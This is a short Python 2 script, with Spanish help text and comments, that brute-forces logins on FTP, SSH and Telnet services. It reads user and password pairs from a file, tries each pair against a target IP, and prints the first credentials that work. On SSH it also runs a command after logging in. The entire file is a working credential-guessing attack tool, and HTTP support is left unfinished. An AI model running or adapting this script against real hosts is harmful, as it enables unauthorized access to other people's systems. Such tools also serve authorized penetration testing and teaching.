from pexpect import pxssh
import argparse, socket, telnetlib

def readFile(fileName):
	lines = open(fileName).read().splitlines()
	return lines

def bruteForce(service, target, lines):
	print "Port: "+str(service)
	if(service == 21):
		for i in lines:
			args = i.split(",")
			user = args[0]
			passwd = args[1]
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((target, 21))
			s.recv(1024)
			print "Trying "+user+" : "+passwd
			s.send("USER "+user+"\r\n")
			s.recv(1024)
			s.send("PASS "+passwd+"\r\n")
			response = s.recv(1024)	
			s.close()
			if("230" in response or "successful" in response):
				print response+" ("+user+" : "+passwd+")"
				return
	elif(service == 22):
		for i in lines:
			args = i.split(",")
			user = args[0]
			passwd = args[1]
			try:
				print "Trying "+user+" : "+passwd
				s = pxssh.pxssh()
				s.login (target, user, passwd)
				s.sendline ('uptime')
   				s.prompt()
   				print s.before   
				s.logout()
				return
			except Exception,e:
				continue
	elif(service == 23):
		for i in lines:
			args = i.split(",")
			user = args[0]
			passwd = args[1]
				
			print "Trying "+user+" : "+passwd
			tn = telnetlib.Telnet(target)
			tn.read_until("login: ")
			tn.write(user + "\n")	
			tn.read_until("Password: ")
			tn.write(passwd + "\n")
			response = tn.read_until("incorrect", 5)
			tn.close()
			if not("incorrect" in response):
				print response
				return
				

		# investigar como mandar para ssh, ftp, telnet, http y https
	
parser = argparse.ArgumentParser(description='Script para realizar fuera a servicios ssh, http, https.')
parser.add_argument('service', help='servicio que se desea realizar fuerza bruta')
parser.add_argument('target', help='ip del target')
parser.add_argument('filename', help='archivo con los users y passwords a probar')
args = parser.parse_args()

services = {'ftp':21, 'ssh':22, 'telnet':23, 'http':80}
target = args.target
lines = readFile(args.filename)

bruteForce(services[args.service], target, lines)


